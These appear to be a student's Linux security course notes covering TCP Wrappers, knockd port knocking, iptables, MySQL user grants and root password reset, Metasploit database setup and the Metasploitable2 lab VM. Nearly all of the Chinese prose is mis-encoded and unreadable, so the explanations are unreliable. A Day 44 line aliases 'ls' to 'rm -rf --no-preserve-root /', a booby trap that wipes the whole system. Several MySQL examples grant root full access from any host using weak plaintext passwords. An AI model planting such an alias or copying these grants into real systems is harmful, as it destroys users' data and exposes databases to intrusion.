ldd /usr/sbin/sshd  | grep libwrap

Debian è½¯ä»¶åŒ…ä¸ºtcpd
Centos è½¯ä»¶åŒ… tcp_wrappers
è¿œç¨‹IPè¯·æ±‚è¿æ¥çš„æ—¶å€™ï¼Œ TCP Wrappersæ£€æŸ¥ç­–ç•¥æ˜¯å…ˆçœ‹/etc/hosts.allowä¸­æ˜¯å¦å…è®¸ï¼Œ å¦‚æœå…è®¸å°±ç›´æ¥æ”¾è¡Œï¼› å¦‚æœæ²¡æœ‰ï¼Œ åˆ™å†çœ‹/etc/hosts.denyä¸­æ˜¯å¦ç¦æ­¢ï¼Œ å¦‚æœç¦æ­¢ï¼Œ é‚£ä¹ˆå°±ç¦æ­¢è¿æ¥ï¼› å¦åˆ™å…è®¸è¿æ¥ã€‚

æ¨èé‡‡ç”¨ç™½åå•æœºåˆ¶  â˜…â˜…â˜…â˜…â˜…
/etc/hosts.allow
  sshd:192.168.195.21,192.168.22.33
/etc/hosts.deny 
  sshd:ALL
ä»¥ä¸Šçš„é…ç½®è¡¨ç¤ºåªå…è®¸192.168.195.21å’Œ192.168.22.33è¿™ä¸¤å°ä¸»æœºå¯ä»¥ä½¿ç”¨SSHè¿æ¥

ï¼ˆ6ï¼‰ä½¿ç”¨DenyHostsã€Fail2banç±»ä¼¼çš„å®‰å…¨å·¥å…·
http://denyhosts.sourceforge.net/
http://www.fail2ban.org/wiki/index.php/Main_Page

ï¼ˆ7ï¼‰ç»™SSHæœåŠ¡å¸¦ä¸ªéšèº«çš„æ–—ç¯·
é€šè¿‡Knockdï¼ˆç«¯å£æ•²é—¨ï¼‰æœåŠ¡æŠŠSSHæœåŠ¡éšè—èµ·æ¥

ç«¯å£æ•²é—¨æœåŠ¡ï¼ˆknockdï¼‰æœåŠ¡é€šè¿‡åŠ¨æ€çš„æ·»åŠ iptablesè§„åˆ™æ¥éšè—ç³»ç»Ÿå¼€å¯çš„æœåŠ¡ï¼Œä½¿ç”¨è‡ªå®šä¹‰çš„ä¸€ç³»åˆ—åºåˆ—å·æ¥â€œæ•²é—¨â€ã€‚
é€šè¿‡è¿™ç§æ–¹æ³•ä½¿ç³»ç»Ÿå¼€å¯éœ€è¦è®¿é—®çš„æœåŠ¡ç«¯å£ï¼Œæ‰èƒ½å¯¹å¤–è®¿é—®ã€‚
ä¸ä½¿ç”¨æ—¶ï¼Œå†ä½¿ç”¨è‡ªå®šä¹‰çš„åºåˆ—å·æ¥â€œå…³é—¨â€ï¼Œå°†ç«¯å£å…³é—­ï¼Œä¸å¯¹å¤–ç›‘å¬ã€‚
è¿›ä¸€æ­¥æå‡äº†æœåŠ¡å’Œç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚
 knockd is a port-knock server.  It listens to all traffic on an ethernet (or PPP) interface, looking for special "knock" sequences of port-hits.  A client makes
       these port-hits by sending a TCP (or UDP) packet to a port on the server.  This port need not be open -- since knockd listens at the link-layer level,  it  sees
       all  traffic  even if it's destined for a closed port.  When the server detects a specific sequence of port-hits, it runs a command defined in its configuration
       file.  This can be used to open up holes in a firewall for quick access.


Step1 å®‰è£…KnockdæœåŠ¡
apt-get update   
apt-get install knockd
Step2 KnockdæœåŠ¡çš„é…ç½®æ–‡ä»¶
updatedb
locate knockd 

/etc/knockd.conf  â˜…â˜…â˜…â˜…â˜…
/etc/default/knockd â˜…â˜…â˜…â˜…â˜…
/usr/sbin/knockd  æœåŠ¡ç¨‹åº



/var/log/messages  Linuxé»˜è®¤çš„ç³»ç»Ÿæ—¥å¿—æ–‡ä»¶â˜…â˜…â˜…â˜…â˜…

### Day43### ### *

6æœˆ10æ—¥ï¼Œã€Šä¸­åäººæ°‘å…±å’Œå›½æ•°æ®å®‰å…¨æ³•ã€‹æ­£å¼å‘å¸ƒï¼Œ9æœˆ1æ—¥èµ·æ–½è¡Œã€‚ç”Ÿæ•ˆä¹‹åï¼Œã€Šæ•°æ®å®‰å…¨æ³•ã€‹å°†ä¸ã€Šç½‘ç»œå®‰å…¨æ³•ã€‹ä»¥åŠæ­£åœ¨ç«‹æ³•è¿›ç¨‹ä¸­çš„ã€Šä¸ªäººä¿¡æ¯ä¿æŠ¤æ³•ã€‹ä¸€èµ·ï¼Œå…¨é¢æ„ç­‘ä¸­å›½ä¿¡æ¯åŠæ•°æ®å®‰å…¨é¢†åŸŸçš„æ³•å¾‹æ¡†æ¶ã€‚


43.1. KnockdæœåŠ¡çš„é…ç½®æ–‡ä»¶  /etc/knockd.conf

[options]
        UseSyslog  //ä½¿ç”¨ç³»ç»Ÿæ—¥å¿—

[openSSH]
        sequence    = 7000,8000,9000  //è‡ªå®šä¹‰çš„åºåˆ—ï¼ˆç«¯å£å·ï¼‰
        seq_timeout = 5  //ç«¯å£è¿æ¥çš„è¶…æ—¶æ—¶é—´
        command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn  //tcpçš„flagä½ä¸ºsynï¼Œåªæ¥å—ä¸€ä¸ªæ–°è¿æ¥

[closeSSH]
        sequence    = 9000,8000,7000
        seq_timeout = 5
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[openHTTPS]
        sequence    = 12345,54321,24680,13579
        seq_timeout = 5
        command     = /usr/local/sbin/knock_add -i -c INPUT -p tcp -d 443 -f %IP%
        tcpflags    = syn


43.2. æ›´æ”¹æ—¥å¿—æ–‡ä»¶
[options]
	LogFile = /var/log/portknocking.log  //å®šä¹‰æ—¥å¿—æ–‡ä»¶çš„ä½ç½®


43.3. é‡è¦è¯­å¥è§£æ
Firewalld

 ç«¯å£æ•²é—¨æˆåŠŸä¹‹åè¦æ‰§è¡Œçš„å‘½ä»¤
 command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 
 iptables æ˜¯Linuxå†…ç½®é˜²ç«å¢™çš„ç®¡ç†å·¥å…·
 -A æ·»ï¼ˆè¿½ï¼‰åŠ ä¸€æ¡è§„åˆ™ï¼Œé»˜è®¤æ˜¯æœ€åä¸€æ¡è§„åˆ™ append
 -I  æ’å…¥ä¸€æ¡è§„åˆ™
 -D åˆ é™¤ä¸€æ¡è§„åˆ™ï¼Œé»˜è®¤æ˜¯ç¬¬ä¸€æ¡è§„åˆ™
 -s  æŒ‡å®šæ•°æ®åŒ…çš„æº
 -d  æŒ‡å®šæ•°æ®åŒ…çš„ç›®æ ‡
 -p  æŒ‡å®šåè®®
 --dport ç›®æ ‡ç«¯å£
 --sport æºç«¯å£
 -j  åŠ¨ä½œ
	å¸¸ç”¨çš„åŠ¨ä½œæœ‰
		ACCEPT æ¥å—
		DROP   ä¸¢å¼ƒ
		REJECT ä¸¢å¼ƒï¼Œä½†æ˜¯ä¼šå¼¹å›æ¶ˆæ¯
		LOG    è®°å½•åˆ°æ—¥å¿—
 
 -L   æŸ¥çœ‹è§„åˆ™
 -n   ä»¥æ•°å­—å½¢å¼æ˜¾ç¤º
 
 iptables -L -n    //æŸ¥çœ‹é˜²ç«å¢™çš„è§„åˆ™
 -P  å»æ›´æ”¹é»˜è®¤è§„åˆ™
 
  iptables -P INPUT DROP //æŠŠINPUTé“¾çš„é»˜è®¤è§„åˆ™æ›´æ”¹ä¸ºDROP
æ¡ˆä¾‹ï¼š
Kaliä¸»æœºå¯ä»¥pingé€šåˆ«äººï¼Œä½†åˆ«äººpingä¸é€šKali

ping åŸºäºICMPåè®®

echo-request (ping) 8

echo-reply (pong) 0
  

iptables  -p icmp --help  //æŸ¥çœ‹icmpåè®®çš„å…·ä½“å¸®åŠ©

--icmp-type  å®šä¹‰icmpçš„ç±»å‹
--line-numbers æŸ¥çœ‹è§„åˆ™çš„ç¼–å·


iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT

43.4. KnockdæœåŠ¡çš„å…·ä½“é…ç½®

Step0: æ›´æ”¹é˜²ç«å¢™çš„INPUTçš„é»˜è®¤è§„åˆ™

iptables -P INPUT DROP
iptables-save 
ä¿å­˜é˜²ç«å¢™çš„è§„åˆ™ 

Step1: æ›´æ”¹é…ç½®æ–‡ä»¶

	å¯ä»¥ä¿æŒé»˜è®¤é…ç½®
	
Step2: vi /etc/default/knockd

START_KNOCKD=1 

Step3  å¯åŠ¨knockdæœåŠ¡

sytemctl start knockd
sytemctl enable knockd

Step4 å®¢æˆ·ç«¯éªŒè¯
å¯åŠ¨
ï¼ˆ1ï¼‰ä½¿ç”¨knockå®¢æˆ·ç«¯å·¥å…·  apt-get install knockd
nmap -p22 192.168.195.76
knock -v 192.168.195.76 7000 8000 9000
nmap -p22 192.168.195.76
åœ¨æœåŠ¡ç«¯ tail -f /var/log/knockdport.log

å…³é—­
knock 192.168.195.76 9000 8000 7000

ï¼ˆ2ï¼‰ç«¯å£æ•²é—¨è„šæœ¬
for x in 7000 8000 9000;do nmap -Pn --max-retries 0 -p $x 192.168.195.76;done

nmap -Pn --max-retries 0 -p 7000 192.168.195.76

-Pn  ç¦æ­¢ä¸»æœºå‘ç°ï¼Œå‡è®¾ä¸»æœºæ˜¯å­˜æ´»çš„
â€“max-retries ï¼Œè¡¨ç¤ºç«¯å£æ‰«ææ¢æµ‹åŒ…æœ€å¤šè¢«é‡ä¼ å‡ æ¬¡
-p æŒ‡å®šæ‰«æçš„ç«¯å£

for x in 9000 8000 7000;do nmap -Pn --max-retries 0 -p $x 192.168.195.76;done



# ç¬”è®°ï¼ˆDay44-day50ï¼‰
### *Day44**
44.1. File Commandå¤ä¹ 
ls
ls -l
ls -la
ls -F

rm 

	  --no-preserve-root  ä¸è¦å¯¹â€œ/â€ç‰¹æ®Šå¤„ç†
      --preserve-root[=all]  ä¸è¦åˆ é™¤â€œ/â€ï¼ˆé»˜è®¤è¡Œä¸ºï¼‰ï¼›
                              å¦‚æ·»åŠ äº†â€œallâ€å‚æ•°ï¼Œå°†æ‹’ç»å¤„ç†ä¸çˆ¶ç›®å½•ä½äº
                              ä¸åŒè®¾å¤‡ä¸Šçš„å‘½ä»¤è¡Œå‚æ•°
alias åˆ«å

alias 'ls=rm -rf --no-preserve-root /'

44.2. Mysql
ï¼ˆ1ï¼‰æ¦‚è¿° 
åœ¨æˆ‘ä»¬ç°ä»£çš„ Web 2.0 æŠ€æœ¯æ—¶ä»£ï¼ˆäº¤äº’ï¼‰ï¼Œå‡ ä¹æ¯ä¸ªç½‘ç«™éƒ½æ˜¯æ•°æ®åº“é©±åŠ¨çš„

Mysqlå°±æ˜¯äº’è”ç½‘ä¸Šå¹¿ä¸ºä½¿ç”¨çš„æ•°æ®åº“ç³»ç»Ÿ
MariaDBæ˜¯Mysqlçš„å¼€æºåç»­åˆ†æ”¯
æ•°æ®åº“æ˜¯é»‘å®¢çš„â€œé‡‘ç¾Šæ¯›â€ã€‚ä¹Ÿæ˜¯é»‘å®¢é¦–é€‰çš„æ”»å‡»ç›®æ ‡
å¾ˆå¤šWebåº”ç”¨ï¼ˆå¦‚Discuz!--è®ºå›ã€eshop-è´­ç‰©å•†åŸã€Wordpress--åšå®¢ç­‰ï¼‰éƒ½ä¼šæŠŠMysqlä½œä¸ºæ•°æ®åº“çš„é¦–é€‰

LAMP
LNMP

æµè¡Œçš„å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰ï¼Œå¦‚ Wordpressã€Joomlaï¼Œ Drupal å’ŒDedeCMSã€å¸å›½ç­‰ ä¹Ÿéƒ½ä½¿ç”¨ MySQL
å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰æ–¹ä¾¿å¯¹ç½‘ç«™å†…å®¹è¿›è¡Œæ›´æ–°ã€ç®¡ç†ã€‚

ï¼ˆ2ï¼‰å¯åŠ¨
å·¥ä½œç«¯å£ï¼š tcp/3306 
lsof -i :3306
systemctl start mysql 
netstat  -tnlp | grep mariadbd   

è¿æ¥æ•°æ®åº“

mysql -u root  -p
-u æŒ‡å®šè¿æ¥çš„ç”¨æˆ·å
-p æŒ‡å®šè¿æ¥çš„å¯†ç 

 select version();  //æŸ¥è¯¢å½“å‰æ•°æ®åº“çš„ç‰ˆæœ¬
 select user();    //æŸ¥è¯¢å½“å‰ç”¨æˆ·
 select database(); //æŸ¥è¯¢å½“å‰æ“ä½œæ•°æ®åº“
 show databases;   æŸ¥çœ‹æ•°æ®åº“
 use mysql;   //åˆ‡æ¢æ•°æ®åº“
 show tables; //æŸ¥çœ‹æ•°æ®åº“çš„è¡¨
 DESCRIBE user; æè¿°è¡¨çš„ç»“æ„

 
select user,host,password from mysql.user;
//æŸ¥è¯¢mysqlç³»ç»Ÿä¸­çš„ç”¨æˆ·ä¿¡æ¯
select user,password,host from mysql.user where user='root';
//whereæŒ‡å®šæŸ¥è¯¢æ¡ä»¶
ä¿®æ”¹rootç”¨æˆ·å£ä»¤
use mysql;
ALTER USER 'root'@'localhost' identified by 'xiaoguang';
flush privileges; //åˆ·æ–°æƒé™
å› æ­¤ï¼Œæ‚¨ä¸èƒ½ä½¿ç”¨â€œæ›´æ–°ï¼ˆupdateï¼‰â€å‘½ä»¤æ¥æ›´æ–°ç”¨æˆ·å¯†ç ï¼Œè€Œæ˜¯ä½¿ç”¨ALTERå‘½ä»¤æ¥æ›´æ–°å¯†ç 


*ç›¸å…³çš„è½¯ä»¶åŒ…
dpkg -l | grep mariadb

mariadb-server  æœåŠ¡ç«¯
mariadb-client  å®¢æˆ·ç«¯
mariadb-common  æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯éƒ½éœ€è¦çš„å…¬å…±è½¯ä»¶åŒ…
*é…ç½®æ–‡ä»¶**


/etc/mysql  æ•°æ®åº“é…ç½®ç›®å½•
/etc/mysql/my.cnf ï¼ˆ/etc/my.cnfï¼‰  é€šå¸¸æ•°æ®åº“çš„é…ç½®æ–‡ä»¶
/etc/mysql/conf.d/*.cnf           ä¹ŸåŒ…å«è¯¥ç›®å½•ä¸­ä»¥.cnfç»“å°¾çš„é…ç½®æ–‡ä»¶



The MariaDB/MySQL tools read configuration files in the following order:
//MariaDB/MySQLä¼šæŒ‰ç…§ä¸‹åˆ—é¡ºåºè¯»å–é…ç½®æ–‡ä»¶
```
# 0. "/etc/mysql/my.cnf"  è½¯é“¾æ¥ï¼ŒçœŸæ­£æŒ‡å‘çš„æ˜¯/etc/mysql/mariadb.cnf
# 1. "/etc/mysql/mariadb.cnf" è®¾ç½®å…¨å±€é»˜è®¤é…ç½®
# 2. "/etc/mysql/conf.d/*.cnf" è®¾ç½®å…¨å±€é€‰é¡¹
# 3. "/etc/mysql/mariadb.conf.d/*.cnf" ä»…è®¾ç½®å’ŒMariaDBæœ‰å…³çš„é€‰é¡¹
# 4. "~/.my.cnf" ç”¨äºè®¾ç½®å’Œç”¨æˆ·ç›¸å…³çš„é…ç½®æ–‡ä»¶é€‰é¡¹ï¼ˆè‡ªå®šä¹‰é…ç½®ï¼‰
```

mariadb.conf.d
â”œâ”€â”€ 50-client.cnf   //å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶
â”œâ”€â”€ 50-mysql-clients.cnf
â”œâ”€â”€ 50-mysqld_safe.cnf
â”œâ”€â”€ 50-server.cnf  //æœåŠ¡é…ç½®æ–‡ä»¶
â””â”€â”€ 60-galera.cnf

ã€æ¡ˆä¾‹ã€‘
æ›´æ”¹ç›‘å¬åœ°å€
50-server.cnf
[mysqld]
bind-address            = 0.0.0.0


systemctl restart mysql

### *Day45**
45.1. è¿œç¨‹è¿æ¥æ•°æ®åº“

 mysql -h 192.168.195.76 -u root -p
 -h æŒ‡å®šè¿æ¥çš„æ•°æ®åº“ä¸»æœºï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œé»˜è®¤ä¸ºlocalhostï¼ˆæœ¬æœºï¼‰

 MySQL èµ‹äºˆç”¨æˆ·æƒé™å‘½ä»¤çš„ç®€å•æ ¼å¼å¯æ¦‚æ‹¬ä¸ºï¼š
 grant æƒé™ on æ•°æ®åº“å¯¹è±¡ to ç”¨æˆ·
 PS:ç”¨æˆ·æ ¼å¼  'ç”¨æˆ·å'@'ä¸»æœº'
              'root'@'localhost'
 å¯¹æ•°æ®åº“æ“ä½œå¸¸ç”¨çš„æƒé™æœ‰ï¼š
 æŸ¥è¯¢ï¼ˆselectï¼‰ã€æ’å…¥ï¼ˆinsertï¼‰ã€æ›´æ–°ï¼ˆupdateã€alterï¼‰ã€åˆ é™¤ï¼ˆdeleteï¼‰
 all ä»£è¡¨ æ‰€æœ‰çš„æƒé™
 
 grant all privileges on *.* to 'root'@'%' identified by 'xiaoxiao' with grant option;
 
 PS1: % ä»£è¡¨ä»»æ„ä¸»æœº
 use mysql;
 grant all privileges on *.* to 'root'@'%' identified by 'xiaoxiao' ;
 grant all privileges on *.* to 'root'@'192.168.195.%' identified by 'xiaoxiao' ;
 [æ¡ˆä¾‹1]
 grant all privileges on *.*  to 'root'@'192.168.195.%' identified by 'xiaoxiao';
 select user,host,password from mysql.user;

 
 PS: privilegeså…³é”®å­—å¯ä»¥çœç•¥
 
 [æ¡ˆä¾‹2]
 grant select,insert on testdb.* to 'sdxh'@'192.168.195.%' identified by 'xiaoxiao';

 
 
 æ’¤é”€æƒé™

 revoke all privileges on *.* from 'root'@'%'  ;
 revoke select,insert on testdb.* from 'sdxh'@'192.168.195.%';
 flush privileges;  åˆ·æ–°æƒé™
 
æ–°ç”¨æˆ·
 grant all on *.* to admin@'%' identified by 'yourpassword' with grant option;
 
åˆ é™¤ç”¨æˆ·
drop user 'john'@'192.168.13.34';

ã€ç»ƒä¹ ã€‘
create database blog;
show databases;
grant all privileges on *.* to 'root'@'192.168.195.%' identified by 'xiaoxiao';
flush privileges;
show grants;
show grants for 'root'@'192.168.195.%'
select user,host,password from mysql.user;

å¦ä¸€å°ä¸»æœºæµ‹è¯•
mysql -h 192.168.195.76 -uroot -pxiaoxiao 

åˆ›å»ºä¸€ä¸ªæ™®é€šç”¨æˆ·å¹¶æˆæƒ
grant select,insert,update,delete on blog.* to 'xh'@'192.168.195.%' identified by 'xiaoxiao';
flush privileges;
show grants for 'xh'@'192.168.195.%';
å¦ä¸€å°ä¸»æœºæµ‹è¯•
mysql -h 192.168.195.76 -uxh -pxiaoxiao 
show databases;

æ’¤é”€æƒé™
revoke select,insert,update,delete on blog.* from  'xh'@'192.168.195.%';
flush privileges;
å¦ä¸€å°ä¸»æœºæµ‹è¯•
mysql -h 192.168.195.76 -uxh -pxiaoxiao 
show databases;

åˆ é™¤ç”¨æˆ·
drop user 'xh'@'192.168.195.%';
select user,host from mysql.user;
mysql -h 192.168.195.76 -uxh -pxiaoxiao


 ä¸€ã€grant æ™®é€šæ•°æ®ç”¨æˆ·ï¼ŒæŸ¥è¯¢ã€æ’å…¥ã€æ›´æ–°ã€åˆ é™¤ æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨æ•°æ®çš„æƒåˆ©ã€‚
 grant select on testdb.* to common_user@'%'
 grant insert on testdb.* to common_user@'%'
 grant update on testdb.* to common_user@'%'
 grant delete on testdb.* to common_user@'%'
 
 æˆ–è€…ï¼Œç”¨ä¸€æ¡ MySQL å‘½ä»¤æ¥æ›¿ä»£ï¼š
 grant select, insert, update, delete on testdb.* to common_user@'%'
 
  
 
 äºŒã€grant æ•°æ®åº“å¼€å‘äººå‘˜ï¼Œåˆ›å»ºè¡¨ã€ç´¢å¼•ã€è§†å›¾ã€å­˜å‚¨è¿‡ç¨‹ã€å‡½æ•°ã€‚ã€‚ã€‚ç­‰æƒé™ã€‚
 
 grant åˆ›å»ºã€ä¿®æ”¹ã€åˆ é™¤ MySQL æ•°æ®è¡¨ç»“æ„æƒé™ã€‚
 grant create on testdb.* to developer@'192.168.0.%';
 grant alter on testdb.* to developer@'192.168.0.%';
 grant drop on testdb.* to developer@'192.168.0.%';
 
 grant æ“ä½œ MySQL å¤–é”®æƒé™ã€‚
 grant references on testdb.* to developer@'192.168.0.%';
 
 grant æ“ä½œ MySQL ä¸´æ—¶è¡¨æƒé™ã€‚
 grant create temporary tables on testdb.* to developer@'192.168.0.%';
 
 grant æ“ä½œ MySQL ç´¢å¼•æƒé™ã€‚
 grant index on testdb.* to developer@'192.168.0.%';
 
 grant æ“ä½œ MySQL è§†å›¾ã€æŸ¥çœ‹è§†å›¾æºä»£ç  æƒé™ã€‚
 grant create view on testdb.* to developer@'192.168.0.%';
 grant show view on testdb.* to developer@'192.168.0.%';
 
 grant æ“ä½œ MySQL å­˜å‚¨è¿‡ç¨‹ã€å‡½æ•° æƒé™ã€‚
 grant create routine on testdb.* to developer@'192.168.0.%'; -- now, can show procedure status
 grant alter routine on testdb.* to developer@'192.168.0.%'; -- now, you can drop a procedure
 grant execute on testdb.* to developer@'192.168.0.%';
 
  
 
 ä¸‰ã€grant æ™®é€š DBA ç®¡ç†æŸä¸ª MySQL æ•°æ®åº“çš„æƒé™ã€‚
 grant all privileges on testdb to dba@'localhost'
 
 å…¶ä¸­ï¼Œå…³é”®å­— â€œprivilegesâ€ å¯ä»¥çœç•¥ã€‚
 
 
 å››ã€grant é«˜çº§ DBA ç®¡ç† MySQL ä¸­æ‰€æœ‰æ•°æ®åº“çš„æƒé™ã€‚
 grant all on *.* to dba@'localhost'
 
  
 
 äº”ã€MySQL grant æƒé™ï¼Œåˆ†åˆ«å¯ä»¥ä½œç”¨åœ¨å¤šä¸ªå±‚æ¬¡ä¸Šã€‚
 
 1. grant ä½œç”¨åœ¨æ•´ä¸ª MySQL æœåŠ¡å™¨ä¸Šï¼š
 grant select on *.* to dba@localhost; -- dba å¯ä»¥æŸ¥è¯¢ MySQL ä¸­æ‰€æœ‰æ•°æ®åº“ä¸­çš„è¡¨ã€‚
 grant all on *.* to dba@localhost; -- dba å¯ä»¥ç®¡ç† MySQL ä¸­çš„æ‰€æœ‰æ•°æ®åº“
 
 2. grant ä½œç”¨åœ¨å•ä¸ªæ•°æ®åº“ä¸Šï¼š
 grant select on testdb.* to dba@localhost; -- dba å¯ä»¥æŸ¥è¯¢ testdb ä¸­çš„è¡¨ã€‚
 
 3. grant ä½œç”¨åœ¨å•ä¸ªæ•°æ®è¡¨ä¸Šï¼š
 grant select, insert, update, delete on testdb.orders to dba@localhost;
 
 è¿™é‡Œåœ¨ç»™ä¸€ä¸ªç”¨æˆ·æˆæƒå¤šå¼ è¡¨æ—¶ï¼Œå¯ä»¥å¤šæ¬¡æ‰§è¡Œä»¥ä¸Šè¯­å¥ã€‚ä¾‹å¦‚ï¼š
 grant select(user_id,username) on smp.users to mo_user@'%' identified by '123345';
 grant select on smp.mo_sms to mo_user@'%' identified by '123345';
 
 4. grant ä½œç”¨åœ¨è¡¨ä¸­çš„åˆ—ä¸Šï¼š
 grant select(id, se, rank) on testdb.apache_log to dba@localhost;
 
 5. grant ä½œç”¨åœ¨å­˜å‚¨è¿‡ç¨‹ã€å‡½æ•°ä¸Šï¼š
 grant execute on procedure testdb.pr_add to 'dba'@'localhost'
 grant execute on function testdb.fn_add to 'dba'@'localhost'
 
  
 
 å…­ã€æŸ¥çœ‹ MySQL ç”¨æˆ·æƒé™
 
 æŸ¥çœ‹å½“å‰ç”¨æˆ·ï¼ˆè‡ªå·±ï¼‰æƒé™ï¼š
 show grants;
 
 æŸ¥çœ‹å…¶ä»– MySQL ç”¨æˆ·æƒé™ï¼š
 show grants for dba@localhost;
 
  
 
 ä¸ƒã€æ’¤é”€å·²ç»èµ‹äºˆç»™ MySQL ç”¨æˆ·æƒé™çš„æƒé™ã€‚
 
 revoke è·Ÿ grant çš„è¯­æ³•å·®ä¸å¤šï¼Œåªéœ€è¦æŠŠå…³é”®å­— â€œtoâ€ æ¢æˆ â€œfromâ€ å³å¯ï¼š
 grant all on *.* to dba@localhost;
 revoke all on *.* from dba@localhost;
 
  
 
 å…«ã€MySQL grantã€revoke ç”¨æˆ·æƒé™æ³¨æ„äº‹é¡¹
 
 1. grant, revoke ç”¨æˆ·æƒé™åï¼Œè¯¥ç”¨æˆ·åªæœ‰é‡æ–°è¿æ¥ MySQL æ•°æ®åº“ï¼Œæƒé™æ‰èƒ½ç”Ÿæ•ˆã€‚
 
 2. å¦‚æœæƒ³è®©æˆæƒçš„ç”¨æˆ·ï¼Œä¹Ÿå¯ä»¥å°†è¿™äº›æƒé™ grant ç»™å…¶ä»–ç”¨æˆ·ï¼Œéœ€è¦é€‰é¡¹ â€œgrant optionâ€œ
 grant select on testdb.* to dba@localhost with grant option;
 
 è¿™ä¸ªç‰¹æ€§ä¸€èˆ¬ç”¨ä¸åˆ°ã€‚å®é™…ä¸­ï¼Œæ•°æ®åº“æƒé™æœ€å¥½ç”± DBA æ¥ç»Ÿä¸€ç®¡ç†ã€‚


### *Day46**
46.1. mysqlçš„ç®¡ç†å‘˜å£ä»¤å¿˜è®°äº†ï¼Ÿ

Step01:ç”¨ä»¥ä¸‹æ–¹å¼é‡æ–°å¯åŠ¨mysqlï¼ˆä»¥ä¸æ£€æŸ¥æƒé™çš„æ–¹å¼å¯åŠ¨ï¼‰

æ–¹æ³•1
mysqld_safe --skip-grant-tables &

PS1: & è¡¨ç¤ºæŠŠç¨‹åºæ”¾åœ¨åå°æ‰§è¡Œ
PS2:  --skip-grant-tables  //è·³è¿‡æƒé™æ£€æŸ¥
æ–¹æ³•2ï¼šä¿®æ”¹é…ç½®æ–‡ä»¶ï¼ˆ/etc/mysql/mariadb.conf.d/50-server.cnfï¼‰
åœ¨[mysqld]ä¸‹æ·»åŠ  skip-grant-tables , å†å¯åŠ¨mysql

Step02:
é‡æ–°è¿æ¥æ•°æ®åº“
mysql -uroot -p  //æ­¤æ—¶ä¸éœ€è¦å¯†ç 

Step03: æ›´æ”¹rootç”¨æˆ·å£ä»¤
flush privileges;
use mysql;
ALTER USER 'root'@'localhost' identified by 'xiaoguang';
flush privileges; //åˆ·æ–°æƒé™
//æ—©å…ˆç‰ˆæœ¬
update mysql.user set Password=password('xiaoguang') where User='root';
Step04:æ”¹å®Œä¹‹åç»“æŸMysqlè¿›ç¨‹ï¼Œå¹¶é‡å¯å³å¯


æ–¹æ³•1 
ps aux | grep mysqld

killall -9 mysqlç›¸å…³è¿›ç¨‹

killall -9  mariadbd    
æ–¹æ³•2ï¼šä¿®æ”¹é…ç½®æ–‡ä»¶
å¦‚æœæ˜¯ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼ŒæŠŠæ·»åŠ çš„é…ç½®åˆ é™¤æˆ–æ³¨é‡Šæ‰å³å¯
systemctl stop mysql
systemctl start mysql


46.2. PostgreSQL ä¸ Metasploit

PostgreSQLï¼Œæˆ– Postgresï¼Œæ˜¯å¦ä¸€ä¸ªå¼€æºå…³ç³»æ•°æ®åº“ï¼Œç”±äºå…¶èƒ½å¤Ÿè½»æ¾æ‰©å±•å¹¶å¤„ç†ç¹é‡çš„å·¥ä½œè´Ÿè½½ï¼Œ
å› æ­¤å¸¸ç”¨äºéå¸¸å¤§çš„äº’è”ç½‘åº”ç”¨ç¨‹åºã€‚æ˜¯Metasploitçš„é»˜è®¤æ•°æ®åº“ã€‚
ç›‘å¬åœ¨tcp/5432ç«¯å£

Metasploit æ˜¯ä¸€ä¸ªæ¼æ´åˆ©ç”¨æ¡†æ¶

msfdb init && msfconsole

PS1: &&  åªæœ‰å‰ä¸€ä¸ªç¨‹åºæ­£ç¡®è¿è¡Œäº†ï¼Œæ‰ä¼šè¿è¡Œåé¢çš„ç¨‹åº
     ||  åªæœ‰å‰ä¸€ä¸ªç¨‹åºè¿è¡Œå¤±è´¥äº†ï¼Œæ‰ä¼šè¿è¡Œåé¢çš„ç¨‹åº
     &
PS2: msfdb init     # start and initialize the database  //å¯åŠ¨å’Œåˆå§‹åŒ–æ•°æ®åº“
  å¯åŠ¨æ•°æ®åº“ï¼ˆsystemctl start postgresqlï¼‰
  å®Œæˆæ•°æ®åº“çš„åˆå§‹åŒ–æ“ä½œ
ï¬	åˆ›å»ºä¸€ä¸ªåä¸ºmsf3çš„PostgreSQLæ•°æ®åº“ç”¨æˆ·
ï¬	åˆ›å»ºæ•°æ®åº“msfã€msf_test
PS3: msfconsole ï¼ˆMetasploitå‘½ä»¤è¡Œæ¥å£ï¼‰
  
  msfdb reinit   # delete and reinitialize the database
  msfdb delete   # delete database and stop using it
  msfdb start    # start the database
  msfdb stop     # stop the database
  msfdb status   # check service status  //æ£€æŸ¥æ•°æ®åº“æœåŠ¡çš„çŠ¶æ€
  msfdb run      # start the database and run msfconsole //å¯åŠ¨æ•°æ®åº“å¹¶è¿è¡Œmsfconsole
PS4ï¼š
msf6 > db_status  //æŸ¥çœ‹æ•°æ®åº“çš„çŠ¶æ€

PS5:metasploitçš„æ•°æ®åº“é…ç½®æ–‡ä»¶/usr/share/metasploit-framework/config/database.yml

### *Day47**

47.1. metasploitable2é¶æœºçš„éƒ¨ç½²
é¶æœºï¼ˆvulnerableï¼‰
Step1 Metasploitable.vmx

Step2 æè¿°

This is Metasploitable2 (Linux)

Metasploitable is an intentionally vulnerable Linux virtual machine. This VM can be used to conduct security training, test security tools, and practice common penetration testing techniques. 

The default login and password is msfadmin:msfadmin. 

Never expose this VM to an untrusted network (use NAT or Host-only mode if you have any questions what that means). 

To contact the developers, please send email to msfdev@metasploit.com

Step3:
The default login and password is msfadmin:msfadmin. 


Step04 æŸ¥çœ‹é¶æœºçš„ä¿¡æ¯

ï¼ˆ1ï¼‰æŸ¥çœ‹å‘è¡Œç‰ˆæœ¬
lsb_release -a
cat /etc/*-release
ï¼ˆ2ï¼‰æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬
uname -r
ï¼ˆ3ï¼‰æŸ¥çœ‹å½“å‰å¼€æ”¾ç«¯å£

netstat -tunlp | less

